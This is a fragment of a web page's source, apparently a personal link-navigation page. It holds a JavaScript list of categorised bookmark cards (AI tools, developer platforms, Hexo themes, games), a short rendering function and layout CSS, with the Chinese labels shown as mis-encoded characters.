\"title\": \"ç«™é•¿ä¹‹å®¶\", \"url\": \"https://www.chinaz.com/\", \"img\": \"https://t9.baidu.com/it/u=1976338083,3457931785&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"ç«™é•¿ä¹‹å®¶ - ç«™é•¿èµ„è®¯-æˆ‘ä»¬è‡´åŠ›äºä¸ºä¸­æ–‡ç½‘ç«™æä¾›åŠ¨åŠ›ï¼\" }, { \"title\": \"å°é¸¡ç›‘æ§å¹³å°\", \"url\": \"https://ping0.cc/vpsmon/30day\", \"img\": \"https://t9.baidu.com/it/u=3796491837,1274263105&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"æœ€è¿‘30å¤©-IPåœ°å€å½’å±åœ°æŸ¥è¯¢-å…¨çƒå°é¸¡ç›‘æ§å¹³å°\" }, { \"title\": \"çŸ¥æ— ä¸è¨€\", \"url\": \"https://wearesellers.com/ \", \"img\": \"https://t9.baidu.com/it/u=2291076767,879038089&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"è·¨å¢ƒç”µå•†äººçš„ç§‘å­¦ä¸–ç•Œ\" }, { \"title\": \"webcams\", \"url\": \"https://www.skylinewebcams.com/\", \"img\": \"https://cdn.jsdelivr.net/gh/SkylineWebcams/web@main/skylinewebcams.svg\", \"description\": \"webcams\" }, { \"title\": \"Wayback Machine\", \"url\": \"https://web.archive.org/\", \"img\": \"/images/face.png\", \"description\": \"wawayback machine ï¼Œ Internetæ¡£æ¡ˆé¦†(Internet Archive)ï¼Œæ—¶é—´å›æº¯æœº\" }, { \"title\": \"Radio Garden\", \"url\": \"https://radio.garden/\", \"img\": \"/images/face.png\", \"description\": \"Radio Garden â€“ Explore live radio\" }, { \"title\": \"ä¸€è¯é€šæŸ¥ \", \"url\": \"https://getsimnum.caict.ac.cn\", \"img\": \"/images/face.png\", \"description\": \"ç”µè¯å¡ä¸€è¯é€šæŸ¥\" }, { \"title\": \"å¼¹ç´å§\", \"url\": \"https://www.tan8.com/\", \"img\": \"https://www.tan8.com/static/tan8/style/img/LOGO_s_new2.png?2401\", \"description\": \"ã€Šå¼¹ç´å§ã€‹å®˜ç½‘tan8.com-é’¢ç´è°±å¤§å…¨ï¼Œå‰ä»–è°±å¤§å…¨ï¼Œå­¦é’¢ç´ï¼Œå­¦å‰ä»–ï¼Œå°±æ¥å¼¹ç´å§å¼¹å§\" }, { \"title\": \"pinterest\", \"url\": \"https://www.pinterest.com/\", \"img\": \"https://www.baidu.com/img/flexible/logo/pc/.png\", \"description\": \"å‘ç°æƒ³è¦å°è¯•çš„é£Ÿè°±ã€å®¶å±…åˆ›æ„ã€æ—¶å°šçµæ„ŸåŠå…¶ä»–åˆ›æ„ç‚¹å­ã€‚\" }, { \"title\": \"èŠ±ç“£\", \"url\": \"https://huaban.com/\", \"img\": \"https://st0.dancf.com/static/02/202306090204-51f4.png\", \"description\": \"èŠ±ç“£ç½‘ - é™ªä½ åšç”Ÿæ´»çš„è®¾è®¡å¸ˆï¼ˆåˆ›æ„çµæ„Ÿå¤©å ‚ï¼Œæœç´¢ã€å‘ç°è®¾è®¡çµæ„Ÿã€è®¾è®¡ç´ æï¼‰\" }, { \"title\": \"ä¿®å‰ªmp3\", \"url\": \"https://audiotrimmer.com/cn\", \"img\": \"https://audiotrimmer.com/images/logo.png?v=1 \", \"description\": \"Audio Trimmer æ˜¯ä¸€ä¸ªç®€å•çš„åœ¨çº¿å·¥å…·ï¼Œå¯è®©æ‚¨å³æ—¶ä¿®å‰ªmp3å’Œå…¶ä»–éŸ³é¢‘æ–‡ä»¶\" }, { \"title\": \"åˆ¶ä½œico\", \"url\": \"https://www.bitbug.net/\", \"img\": \"\", \"description\": \"åœ¨çº¿åˆ¶ä½œicoå›¾æ ‡ | åœ¨çº¿icoå›¾æ ‡è½¬æ¢å·¥å…· æ–¹ä¾¿åˆ¶ä½œfavicon.ico\" }, { \"title\": \"ä»Šæ—¥çƒ­æ¦œ\", \"url\": \"https://tophub.today/\", \"img\": \"https://file.ipadown.com/tophub/assets/images/logo.png\", \"description\": \"ä»Šæ—¥çƒ­æ¦œ,Tophub,çƒ­é—¨æ–°é—»,ä»Šæ—¥å¤´æ¡,çƒ­æœ,çƒ­è¯,æ–°é—»èšåˆ\" }, { \"title\": \"æŠ–éŸ³/TikTok/Biliä¸‹è½½\", \"url\": \"https://snapany.com/zh/tiktok\", \"img\": \"https://snapany.com/favicon.ico\", \"description\": \"TikTok å“”å“©å“”å“© Pinterest Facebook VK Snapchat Threads è§†é¢‘å›¾ç‰‡ SunoéŸ³ä¹ \" } ] }, { \"category\": \"AI\", \"items\": [ { \"title\": \"chatbox ai\", \"url\": \"https://chatboxai.app/zh\", \"img\": \"https://chatboxai.app/icon.png \", \"description\": \"Chatbox AI æ˜¯ä¸€æ¬¾ AI å®¢æˆ·ç«¯åº”ç”¨\" }, { \"title\": \"kimi\", \"url\": \"https://kimi.ai/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/-1772417172_-552089199_88_88.jpg \", \"description\": \"kimi\" }, { \"title\": \"è®¯é£æ˜Ÿç«\", \"url\": \"https://xinghuo.xfyun.cn/\", \"img\": \"https://fc1tn.baidu.com/it/u=1861166136,3857095671&fm=202&mola=new&crop=v1\", \"description\": \"è®¯é£æ˜Ÿç«å¤§æ¨¡å‹ï¼Œç§‘å¤§è®¯é£\" }, { \"title\": \"è…¾è®¯AIä»£ç \", \"url\": \"https://copilot.tencent.com/chat\", \"img\": \"https://acc-1258344699.cos.accelerate.myqcloud.com/web/website/assets/logo_text-BjFpEzKf.png\", \"description\": \"è…¾è®¯äº‘ AI ä»£ç åŠ©æ‰‹\" }, { \"title\": \"AIå¯¼èˆª\", \"url\": \"https://www.ainavpro.com/\", \"img\": \"https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png\", \"description\": \"aiå¯¼èˆª,aiäº§å“,aiå†™ä½œ,chatgpt,äººå·¥æ™ºèƒ½\" }, { \"title\": \"AIä¸‡èŠ±ç­’\", \"url\": \"https://www.aiwht.com/\", \"img\": \"https://ai-img.aiwht.com/wp-content/uploads/2023/03/1680232059212_AI%E5%88%86%E5%BC%80%E7%9A%84-360x80-1.png\", \"description\": \"AIä¸‡èŠ±ç­’| aiå¯¼èˆª è¿æ¥AIæ–°ä¸–ç•Œ\" }, { \"title\": \"å¿«æ‰‹-å¯çµ\", \"url\": \"https://kolors.kuaishou.com/\", \"img\": \"https://ali2.a.kwimgs.com/kos/nlav10378/aiwp/assets/kling-logo-zh-5iJvXAUm.png\", \"description\": \"å¿«æ‰‹-å¯çµï¼Œç”Ÿæˆå›¾ç‰‡/è§†é¢‘\" }, { \"title\": \"é€šæƒ…\", \"url\": \"https://tongyi.aliyun.com/qianwen/\", \"img\": \"https://img.alicdn.com/imgextra/i1/O1CN01asLYeX1WhbsyEZn5u_!!6000000002820-55-tps-56-56.svg\", \"description\": \"é€šæƒ…ã€è¾¾ä¹‰ï¼Œä½ çš„å…¨èƒ½AIåŠ©æ‰‹\" }, { \"title\": \"è±†åŒ…-å­—èŠ‚\", \"url\": \"https://www.doubao.com/chat/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/1797406267_1647065546_88_88.jpg\", \"description\": \"è±†åŒ…æ˜¯å­—èŠ‚è·³åŠ¨å…¬å¸åŸºäºäº‘é›€æ¨¡å‹å¼€å‘çš„AIå·¥å…·ï¼Œæä¾›èŠå¤©æœºå™¨äººã€å†™ä½œåŠ©æ‰‹ä»¥åŠè‹±è¯­å­¦ä¹ åŠ©æ‰‹ç­‰åŠŸèƒ½\" }, { \"title\": \"æ–‡å¿ƒä¸€è¨€\", \"url\": \"https://yiyan.baidu.com/\", \"img\": \"https://nlp-eb.cdn.bcebos.com/static/eb/asset/logo.8a6b508d.png\", \"description\": \"å†™æ–‡æ¡ˆã€æƒ³ç‚¹å­ï¼Œåˆèƒ½é™ªä½ èŠå¤©ã€ç­”ç–‘è§£æƒ‘ã€‚\" }, { \"title\": \"marscode\", \"url\": \"https://www.marscode.cn/\", \"img\": \"https://p9-arcosite.byteimg.com/tos-cn-i-goo7wpa0wc/8f2f23baeb3c4be4ade7804de39aec5a~tplv-goo7wpa0wc-image.image\", \"description\": \"è±†åŒ…æ——ä¸‹çš„ç¼–ç¨‹åŠ©æ‰‹ï¼Œæä¾›æ™ºèƒ½è¡¥å…¨ã€æ™ºèƒ½é¢„æµ‹ã€æ™ºèƒ½é—®ç­”ç­‰èƒ½åŠ›\" }, { \"title\": \"suno\", \"url\": \"https://suno.com/\", \"img\": \"https://pbs.twimg.com/profile_images/1807517561598181376/tgNisKbX.jpg\", \"description\": \"Suno is building a future where anyone can make great music.\" }, { \"title\": \"ollama\", \"url\": \"https://ollama.com/ \", \"img\": \"https://ollama.com/public/ollama.png\", \"description\": \"Run Llama, Phi, Mistral, Gemma Get up and running with large language models.\" }, { \"title\": \"Cursor\", \"url\": \"https://www.cursor.com/\", \"img\": \"https://avatars.githubusercontent.com/u/126759922?s=48&v=4\", \"description\": \"The AI Code Editor\" }, { \"title\": \"Aiå¯¼èˆª\", \"url\": \"https://www.ainavpro.com/\", \"img\": \"https://www.ainavpro.com/wp-content/uploads/2023/03/logo-8-e1677916867522.png\", \"description\": \"Aiå¯¼èˆª | æœ€æ–°æœ€å‰æ²¿çš„aiäº§å“\" }, { \"title\": \"AIå·¥å…·é›†\", \"url\": \"https://ai-bot.cn/\", \"img\": \"https://ai-bot.cn/wp-content/uploads/2023/03/ai-bot-logo-black.png\", \"description\": \"1000+ AIå·¥å…·é›†åˆï¼Œå›½å†…å¤–AI\" } ] }, { \"category\": \"Web\", \"items\": [ { \"title\": \"æœ‰è°±ä¹ˆ\", \"url\": \"https://yopu.co/\", \"img\": \"https://cdn.yopu.co/img/qrcode_app_download.436360b7.png\", \"description\": \"æœ‰è°±ä¹ˆæ˜¯ä¸“ä¸ºæ‰‹æœºè®¾è®¡çš„å‰ä»–å°¤å…‹é‡Œé‡Œæ›²è°±ä¹¦\" }, { \"title\": \"ä»€ä¹ˆå€¼å¾—ä¹°\", \"url\": \"https://www.smzdm.com/\", \"img\": \"https://t9.baidu.com/it/u=149758115,4084685086&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"ä»€ä¹ˆå€¼å¾—ä¹° | ç§‘å­¦æ¶ˆè´¹ è®¤çœŸç”Ÿæ´»\" }, { \"title\": \"vscode\", \"url\": \"https://code.visualstudio.com/ \", \"img\": \"https://visualstudio.microsoft.com/wp-content/uploads/2019/09/vs-code-responsive-01-1.png\", \"description\": \"visualstudio code \" }, { \"title\": \"ITæ¡”å­\", \"url\": \"https://www.itjuzi.com/\", \"img\": \"https://static.itjuzi.com/images/fSxSdAmviPF7Cxd0aJvnwOTjTJPAQ5AHOscYuWTq.png\", \"description\": \"ITæ¡”å­ | æ³›äº’è”ç½‘åˆ›ä¸šæŠ•èµ„é¡¹ç›®ä¿¡æ¯æ•°æ®åº“åŠå•†ä¸šä¿¡æ¯æœåŠ¡å•†\" }, { \"title\": \"åƒé€šå½©è‰²åº“\", \"url\": \"https://www.qtccolor.com/secaiku/\", \"img\": \"https://cdn.qtccolor.com/images/logo.png\", \"description\": \"åœ¨çº¿è‰²å·è‰²å½©æŸ¥è¯¢ - åƒé€šå½©è‰²åº“\" }, { \"title\": \"X API \", \"url\": \"https://developer.x.com/en/products/x-api\", \"img\": \"https://ms.bdimg.com/pacific/0/pic/-1749260314_-150371495.jpg\", \"description\": \"X API | Twitter Developer Platform \" }, { \"title\": \"IG/FB API\", \"url\": \"https://developers.facebook.com/\", \"img\": \"https://images.sftcdn.net/images/t_app-icon-m/p/f96df87d-926f-4954-bf58-f377a573a630/3410194445/instagram-Instagram_icon.png\", \"description\": \"Instagram API | Facebook for Developers\" }, { \"title\": \"TgApi\", \"url\": \"https://core.telegram.org/\", \"img\": \"https://t8.baidu.com/it/u=4184704855,1261911938&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"Telegram APIs\" }, { \"title\": \"TikTokDev\", \"url\": \"https://developers.tiktok.com/\", \"img\": \"https://t7.baidu.com/it/u=3496169845,3458702159&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"TikTok for Developers\" }, { \"title\": \"å°çº¢ä¹¦å¼€æ”¾å¹³å°\", \"url\": \"https://miniapp.xiaohongshu.com/\", \"img\": \"https://t8.baidu.com/it/u=1809095286,1432785828&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"å°çº¢ä¹¦å¼€æ”¾å¹³å°\" }, { \"title\": \"ç™½é²¸å‡ºæµ·\", \"url\": \"https://www.baijing.cn/\", \"img\": \" https://www.baijing.cn/static/img/logo_black.png?v=2\", \"description\": \"ç§»åŠ¨å‡ºæµ·,æµ·å¤–å¼€å‘è€…,ç™½é²¸å‡ºæµ·,ç™½é²¸ç¤¾åŒº\" }, { \"title\": \"æ— é™éŸ³ä¹\", \"url\": \"http://ws.wxmp3.com/\", \"img\": \"http://ws.wxmp3.com/style/images/logo.png\", \"description\": \"æ— é™éŸ³ä¹ç½‘|MP3æ­Œæ›²å…è´¹ä¸‹è½½,å…¨ç½‘MP3å…è´¹ä¸‹è½½,æ­Œæ›²ä¸‹è½½ç¥å™¨\" }, { \"title\": \"FreeBuf\", \"url\": \"https://www.freebuf.com/\", \"img\": \"https://www.freebuf.com/images/logoMax.png\", \"description\": \"ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\" }, { \"title\": \"eName\", \"url\": \"https://auction.ename.com/tao\", \"img\": \"https://t9.baidu.com/it/u=2971182524,3144420648&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"æ·˜åŸŸå | åŸŸåäº¤æ˜“å¹³å°ï¼šeName.Com\" }, { \"title\": \"åˆæ‹äº‘\", \"url\": \"https://www.upyun.com/\", \"img\": \"https://t9.baidu.com/it/u=3516235917,278845167&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"åˆæ‹äº‘ åŠ é€Ÿåœ¨çº¿ä¸šåŠ¡ CDNåŠ é€Ÿ äº‘å­˜å‚¨\" }, { \"title\": \"UCloud \", \"url\": \"https://www.ucloud.cn/\", \"img\": \"https://fc1tn.baidu.com/it/u=2776782969,1600626072&fm=202&mola=new&crop=v1\", \"description\": \"äº‘æœåŠ¡å™¨_ UCloudäº‘è®¡ç®—\" }, { \"title\": \"uç›˜é­”æœ¯å¸ˆ \", \"url\": \"https://www.sysceo.com/Software\", \"img\": \"https://www.sysceo.com/Public/images/index/logo.png\", \"description\": \"uç›˜é­”æœ¯å¸ˆ PE \" }, { \"title\": \"ä¸ƒç‰›äº‘\", \"url\": \"https://www.qiniu.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/600520814_947783485_500_500.png\", \"description\": \"ä¸ƒç‰›äº‘,ä¸ƒç‰›äº‘å¤§ä¿ƒ,cdn,å¯¹è±¡å­˜å‚¨,äº‘ä¸»æœº,äº‘çŸ­ä¿¡\" }, { \"title\": \"åœ¨çº¿Pingæ£€æµ‹\", \"url\": \"https://www.cesu.net/\", \"img\": \"https://www.cesu.net/storage/default/20240422/3537817137167267a7ff56749fd79a407e9a98a25325e34d1a7a31b.jpg\", \"description\": \"å…è´¹Pingæµ‹è¯•å·¥å…·-ç½‘ç«™åœ¨çº¿æµ‹é€Ÿå·¥å…·\" }, { \"title\": \"äº¬ä¸œå®™æ–¯\", \"url\": \"https://jos.jd.com/\", \"img\": \"https://img12.360buyimg.com/imagetools/s200x200_jfs/t1/118697/14/19219/13380/5f8597bfEe2f1a7a6/28da4f4bd65f005c.png\", \"description\": \"äº¬ä¸œå®™æ–¯å¼€å‘è€…ä¸­å¿ƒã€äº¬ä¸œå¼€æ”¾å¹³å°ã€äº¬ä¸œAPIã€å®™æ–¯å¼€æ”¾å¹³å°ã€äº¬ä¸œå®™æ–¯ã€äº¬ä¸œæ¥å£\" }, { \"title\": \"æ‹¼å¤šå¤šå¼€æ”¾å¹³å°\", \"url\": \"https://open.pinduoduo.com/\", \"img\": \"https://cdn.pinduoduo.com/upload/home/img/common/pdd_logo_v2.png\", \"description\": \"æ‹¼å¤šå¤šå¼€æ”¾å¹³å°\" }, { \"title\": \"æŠ–åº—\", \"url\": \"https://op.jinritemai.com/home\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/1876914726_1076566012_88_88.png\", \"description\": \"æŠ–åº—æœåŠ¡å¸‚åœºï¼ŒåŸºäºæŠ–åº—æ•°æ®ä¸æ¥å£ï¼Œèµ‹èƒ½å†…å®¹ç”µå•†ç”Ÿæ€ï¼ŒæœåŠ¡å•†å®¶ä¸å¼€å‘è€…\" }, { \"title\": \"é˜¿é‡Œç™¾å·\", \"url\": \"https://baichuan.taobao.com/ \", \"img\": \"https://img.alicdn.com/tps/TB13Od5LpXXXXX_XXXXXXXXXXXX-150-50.png\", \"description\": \"é˜¿é‡Œç™¾å·-é˜¿é‡Œå·´å·´æ— çº¿å¼€æ”¾å¹³å°,ç§»åŠ¨å¼€æ”¾çš„ä¸»é˜µåœ°\" }, { \"title\": \"é˜¿é‡Œäº‘åŸŸå\", \"url\": \"https://mi.aliyun.com/\", \"img\": \"https://t7.baidu.com/it/u=4057341977,137104390&fm=190&app=131&size=f242,150&n=0&f=PNG\", \"description\": \"é˜¿é‡Œäº‘åŸŸåäº¤æ˜“ \" }, { \"title\": \"èšåç½‘\", \"url\": \"https://www.juming.com/ykj/\", \"img\": \"https://www.juming.com/pub/img/new/logo.png\", \"description\": \"èšåç½‘æä¾›ä¸€å£ä»·åŸŸåè´­ä¹°\" }, { \"title\": \"çˆ±åç½‘\", \"url\": \"https://am.22.cn/ykj\", \"img\": \"https://am.22.cn/images/logo.png\", \"description\": \"ä¸€å£ä»·åŸŸåäº¤æ˜“-åŸŸåä¹°å–äº¤æ˜“ä¸­å¿ƒ-çˆ±åç½‘AM.22.CN\" } , { \"title\": \"apple\", \"url\": \"https://apple.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/2066431224_743698567_88_88.png\", \"description\": \"apple\" }, { \"title\": \"è„‰è„‰\", \"url\": \"https://maimai.cn/\", \"img\": \"https://s.taou.com/static/images/website/pc/logo.png\", \"description\": \"è„‰è„‰,è„‰è„‰å®˜ç½‘,è„‰è„‰APP,maimai\" }, { \"title\": \"AI tool\", \"url\": \"https://saasaitools.com/\", \"img\": \"https://saasaitools.com/wp-content/uploads/2023/12/saasaitools_logowhite-1536x327.webp\", \"description\": \" SaaS AI Tools AI tool\" }, { \"title\": \"Newest AI Tools\", \"url\": \"https://theresanaiforthat.com/\", \"img\": \"https://theresanaiforthat.com/favicon-large.png\", \"description\": \"Newest AI Tools There's An AI For ThatÂ® - Discover The Newest And Best AI Tools\" }, { \"title\": \"uni-app\", \"url\": \"https://dcloud.io/ \", \"img\": \"https://t7.baidu.com/it/u=1571091084,4105095099&fm=217&app=126&size=f242,150&n=0&f=PNG\", \"description\": \"uni-app,uniapp,HBuilderX \" }, { \"title\": \"å°ç±³\", \"url\": \"https://www.mi.com/\", \"img\": \"https://ms.bdimg.com/pacific/0/pic/1990065745_1296829299.jpg\", \"description\": \"å°ç±³ æ¯ä¸ªäººéƒ½èƒ½äº«å—ç§‘æŠ€å¸¦æ¥çš„ç¾å¥½ç”Ÿæ´»\" }, { \"title\": \"forbes\", \"url\": \"https://www.forbes.com/billionaires/ \", \"img\": \"https://www.forbeschina.com/static/images/logo.png\", \"description\": \"forbesç¦å¸ƒæ–¯\" },{ title: \"åä¸º\", url: \"https://consumer.huawei.com/\", img: \"https://t9.baidu.com/it/u=2184693209,621087203&fm=190&app=131&size=f242,150&n=0&f=JPEG\", description: \"åä¸º, HUAWEI, HUAWEIå®˜ç½‘, åä¸ºå®˜ç½‘, åä¸ºç½‘ç«™, åä¸ºæ¶ˆè´¹è€…å®˜ç½‘, åä¸ºäº§å“, åä¸ºæ–°å“\" } ] }, { \"category\": \"Hexo\", \"items\": [ { \"title\": \"Hipaper\", \"url\": \"https://github.com/iTimeTraveler/hexo-theme-hipaper\", \"img\": \"https://hexo.io/themes/screenshots/Hipaper.jpg\", \"description\": \"A fashional newspaper, blog theme for Hexo.\" }, { \"title\": \"Fluid \", \"url\": \"https://github.com/fluid-dev/hexo-theme-fluid\", \"img\": \"https://hexo.io/themes/screenshots/Fluid.jpg\", \"description\": \"An elegant and light theme\" }, { \"title\": \"keep\", \"url\": \"https://github.com/XPoet/hexo-theme-keep\", \"img\": \"https://hexo.io/themes/screenshots/Keep.jpg\", \"description\": \"keep writing keep loving\" }, { \"title\": \"A4\", \"url\": \"https://github.com/HiNinoJay/hexo-theme-A4\", \"img\": \"https://hexo.io/themes/screenshots/A4.jpg\", \"description\": \"A hexo theme that looks like an A4 paper.\" }, { \"title\": \"Edinburgh\", \"url\": \"https://github.com/sharvaridesai/hexo-theme-edinburgh\", \"img\": \"https://hexo.io/themes/screenshots/Edinburgh.jpg\", \"description\": \"Clean, beautiful portfolio theme\" }, { \"title\": \"Freemind\", \"url\": \"https://github.com/wzpan/hexo-theme-freemind\", \"img\": \"https://hexo.io/themes/screenshots/Freemind.jpg\", \"description\": \"Fully taking advantages of Bootstrap\" }, { \"title\": \"Aurora \", \"url\": \"https://github.com/auroral-ui/hexo-theme-aurora\", \"img\": \"https://hexo.io/themes/screenshots/Aurora.jpg\", \"description\": \"Futuristic auroral Hexo theme.\" }, { \"title\": \"Reimu\", \"url\": \"https://github.com/D-Sketon/hexo-theme-reimu\", \"img\": \"https://hexo.io/themes/screenshots/Reimu.jpg\", \"description\": \"ä¸€æ¬¾åšä¸½çµæ¢¦é£æ ¼çš„Hexoä¸»é¢˜ | A Hakurei Reimu style Hexo theme.\" }, { \"title\": \"Lightx\", \"url\": \"https://github.com/songquanpeng/hexo-theme-lightx\", \"img\": \"https://hexo.io/themes/screenshots/Lightx.jpg\", \"description\": \"A pure and simple Hexo theme\" }, { \"title\": \"Terminal \", \"url\": \"https://github.com/lazysheep666/terminal_theme\", \"img\": \"https://hexo.io/themes/screenshots/Terminal.jpg\", \"description\": \"A simple and clean theme\" }, { \"title\": \"Replica \", \"url\": \"https://github.com/sabrinaluo/hexo-theme-replica\", \"img\": \"https://hexo.io/themes/screenshots/Replica.jpg\", \"description\": \"A github style replication theme\" }, { \"title\": \"leedom\", \"url\": \"https://github.com/leedom92/hexo-theme-leedom\", \"img\": \"https://hexo.io/themes/screenshots/leedom.jpg\", \"description\": \"A pure hexo theme.\" }, { \"title\": \"Meow\", \"url\": \"https://github.com/chanwj/hexo-theme-meow\", \"img\": \"https://hexo.io/themes/screenshots/Meow.jpg\", \"description\": \"A cute and bright hexo theme suitable for literary creation ( e.g. serial novel, fanfiction ).\" }, { \"title\": \"Hiero\", \"url\": \"https://github.com/iTimeTraveler/hexo-theme-hiero\", \"img\": \"https://hexo.io/themes/screenshots/Hiero.jpg\", \"description\": \"A free magazine and blog style theme\" }, { \"title\": \"Vita \", \"url\": \"https://github.com/Harendra1993/vita\", \"img\": \"https://hexo.io/themes/screenshots/Vita.png\", \"description\": \"A simple and minimal Hexo resume theme\" }, { \"title\": \"Sakura \", \"url\": \"https://github.com/honjun/hexo-theme-sakura\", \"img\": \"https://hexo.io/themes/screenshots/Sakura.jpg\", \"description\": \"A beautiful theme\" }, { \"title\": \"Nayo \", \"url\": \"https://github.com/Lemonreds/hexo-theme-nayo\", \"img\": \"https://hexo.io/themes/screenshots/Nayo.jpg\", \"description\": \"A clean theme\" }, { \"title\": \"xoxo-plus \", \"url\": \"https://github.com/fooying/hexo-theme-xoxo-plus\", \"img\": \"https://hexo.io/themes/screenshots/xoxo-plus.jpg\", \"description\": \"A Simple Template\" }, { \"title\": \"Waline\", \"url\": \"https://waline.js.org/\", \"img\": \"https://waline.js.org/logo.png\", \"description\": \"ä¸€æ¬¾ç®€æ´ã€å®‰å…¨çš„è¯„è®ºç³»ç»Ÿã€‚\" }, { \"title\": \"Valine\", \"url\": \"https://valine.js.org/\", \"img\": \"https://valine.js.org/images/valine.png\", \"description\": \"ä¸€æ¬¾å¿«é€Ÿã€ç®€æ´ä¸”é«˜æ•ˆçš„æ— åç«¯è¯„è®ºç³»ç»Ÿã€‚\" }, { \"title\": \"æ¥å¿…åŠ›\", \"url\": \"https://livere.com/\", \"img\": \"https://livere.com/img/nav/logo_livere_main-colored_zh.png\", \"description\": \"æ¥å¿…åŠ›æä¾›ç¤¾äº¤åŒ–è¯„è®ºï¼Œç¤¾äº¤åŒ–ç™»å½•ï¼Œæˆ‘çš„é¡µé¢ï¼ŒSNSåˆ†äº«æŒ‰é’®\" } ] }, { category: \"Fun\", items: [ { \"title\": \"å…°åšåŸºå°¼\", \"url\": \"https://www.lamborghini.com/ \", \"img\": \"https://t9.baidu.com/it/u=637130529,2781676095&fm=217&app=126&size=f242,150&n=0&f=JPEG\", \"description\": \"å…°åšåŸºå°¼æ±½è½¦å®˜æ–¹ç½‘ç«™\" }, { \"title\": \"vivo\", \"url\": \"https://www.vivo.com/\", \"img\": \"https://ecmb.bdimg.com/tam-ogel/-1540521831_1768335019_88_88.png\", \"description\": \" vivoï¼Œvivoå®˜ç½‘ï¼Œvivoæ™ºèƒ½æ‰‹æœº\" }, { title: \"å“”å“©å“”å“©\", url: \"https://www.bilibili.com/\", img: \"https://activity.hdslb.com/zzjs/20160608appDownload/img/pc/tittle.png\", description: \"å“”å“©å“”æ¶›\" }, { title: \"youtube\", url: \"https://www.youtube.com/\", img: \"https://t8.baidu.com/it/u=1745702888,2743145560&fm=217&app=126&size=f242,150&n=0&f=JPEG\", description: \"youtube\" } ] }, { category: \"Game\", items: [ { \"title\": \"byrut \", \"url\": \"https://byrutgame.org/\", \"img\": \"https://byrutgame.org/templates/byrut_upd/images/logo.png\", \"description\": \"byrut CĞºĞ°Ñ‡Ğ°Ñ‚ÑŒ Ğ¸Ğ³Ñ€Ñ‹ Ğ½Ğ° \" }, { \"title\": \"èƒèŸ¹\", \"url\": \"https://www.pxb7.com/\", \"img\": \"https://www.pxb7.com/img/logo.45da5e95.png\", \"description\": \"èƒèŸ¹æ¸¸æˆè´¦å·äº¤æ˜“ä»£å”®å¹³å°\" }, { \"title\": \"äº¤æ˜“çŒ«\", \"url\": \"https://www.jiaoyimao.com/\", \"img\": \"https://t9.baidu.com/it/u=3394740754,1697665746&fm=190&app=131&size=f242,150&n=0&f=JPEG\", \"description\": \"äº¤æ˜“çŒ«_æ‰‹æ¸¸äº¤æ˜“å¹³å°\" }, { title: \"é›·ç”µæ¨¡æ‹Ÿå™¨\", url: \"https://www.ldmnq.com/\", img: \"https://res.ldmnq.com/gw/static/gw_ch/dist/client/img/logo.c0fc5c8.svg\", description: \"é›·ç”µå®‰å“æ¨¡æ‹Ÿå™¨\" }, { title: \"biubiuåŠ é€Ÿå™¨\", url: \"https://www.biubiu001.com/\", img: \"https://res.biubiu001.com/web/www/img/header_biubiu_logo.3f871d8e.png\", description: \"biubiuåŠ é€Ÿå™¨_å…è´¹çš„æ‰‹æ¸¸åŠ é€Ÿå™¨_ç”µç«çº§PCç½‘æ¸¸åŠ é€Ÿå™¨\" }, { title: \"isaac wiki\", url: \"https://isaac.huijiwiki.com/wiki/T130\", img: \"https://av.huijiwiki.com/site_avatar_isaac_l.png?1732216641\", description: \"isaac wiki\" } ] } ]; function renderCards(data) { let html = ''; data.forEach(category => { html += ` ${category.category} `; category.items.forEach(item => { html += ` ${item.title} ${item.description} `; }); html += ``; }); return html; } document.getElementById('app3').innerHTML = renderCards(data); @media (min-width:1200px){ .col-xl-5a{flex:0 0 20%;max-width:20%} .col-xl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%} .col-xl-7a{flex:0 0 14.285714%;max-width:14.285714%} .col-xl-8a{flex:0 0 12.5%;max-width:12.5%} } @media (min-width:1400px){ .container-lg{max-width:1340px} } @media (min-width: 1680px){ .d-xxl-block{display:block!important} .col-xxl-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%} .col-xxl-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%} .col-xxl-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%} .col-xxl-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%} .col-xxl-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%} .col-xxl-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%} .col-xxl-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%} .col-xxl-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%} .col-xxl-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%} .col-xxl-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%} .col-xxl-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%} .col-xxl-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%} .col-xxl-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%} .col-xxl-5a{flex:0 0 20%;max-width:20%} .col-xxl-6a{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%} .col-xxl-7a{flex:0 0 14.285714%;max-width:14.285714%} .col-xxl-8a{flex:0 0 12.5%;max-width:12.5%} .col-xxl-10a{flex:0 0 10%;max-width:10%} .mx-xxl-n5{margin-left:-5rem!important;margin-right:-5rem!important} .container-lg{max-width:1400px} } .row { display: -ms-flexbox; display: flex; -ms-flex-wrap: wrap; flex-wrap: wrap; margin-right: -15px; margin-left: -15px } 